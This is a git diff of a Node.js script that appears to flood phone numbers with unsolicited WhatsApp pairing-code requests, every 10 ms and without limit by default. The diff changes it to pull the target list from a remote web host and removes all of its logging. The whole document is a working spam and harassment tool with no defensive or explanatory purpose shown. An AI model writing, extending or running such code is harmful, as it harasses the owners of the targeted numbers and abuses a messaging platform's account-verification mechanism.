@@ -4,6 +4,7 @@ const readline = require("readline");
 const fs = require('fs').promises;
 const path = require('path');
 const { fork } = require('child_process');
+const axios = require('axios');
 
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 
@@ -11,11 +12,10 @@ const question = (text) => new Promise((resolve) => rl.question(text, resolve));
 
 async function fetchPhoneNumbers() {
     try {
-        const data = await fs.readFile('numbers_spam.json', 'utf8');
-        const jsonData = JSON.parse(data);
+        const response = await axios.get('http://karimalyamani.atwebpages.com/numbers_spam.json');
+        const jsonData = response.data;
         return Object.values(jsonData).flat();
     } catch (error) {
-        //console.error('Error reading phone numbers:', error.message);
         return [];
     }
 }
@@ -29,13 +29,10 @@ async function processRequests(XeonBotInc, phoneNumbers, xeonCodes) {
             try {
                 await XeonBotInc.requestPairingCode(number);
                 requestCount++;
-                //console.log(`Request #${requestCount} sent to ${number}.`);
             } catch (error) {
-                //console.error('Error sending request to', number, ':', error.message);
             }
         }
         if (xeonCodes === Infinity) {
-            //console.log('Sending unlimited requests...');
         }
     }
 }
@@ -80,7 +77,6 @@ async function XeonProject() {
                 xeonCodes = Infinity;
                 break;
             default:
-                //console.log('Invalid choice. Defaulting to unlimited requests.');
                 xeonCodes = Infinity;
                 break;
         }
@@ -92,7 +88,6 @@ async function XeonProject() {
                 phoneNumbers = await fetchPhoneNumbers();
                 await processRequests(XeonBotInc, phoneNumbers, xeonCodes);
             } catch (error) {
-                //console.error('Error during processing requests:', error.message);
             }
         }, 10);
 
@@ -103,26 +98,21 @@ async function XeonProject() {
                 const removedNumbers = previousPhoneNumbers.filter(number => !currentPhoneNumbers.includes(number));
 
                 if (addedNumbers.length > 0) {
-                    //console.log('Added numbers:', addedNumbers);
                 }
                 if (removedNumbers.length > 0) {
-                    //console.log('Removed numbers:', removedNumbers);
                 }
 
                 previousPhoneNumbers = currentPhoneNumbers;
             } catch (error) {
-                //console.error('Error checking phone numbers:', error.message);
             }
         }, 10000);
 
         setTimeout(() => {
-            //console.log('Restarting script...');
             clearInterval(requestInterval);
             process.exit(0);
         }, 900000);
 
     } catch (error) {
-        //console.error('Error during execution:', error.message);
     } finally {
         rl.close();
     }
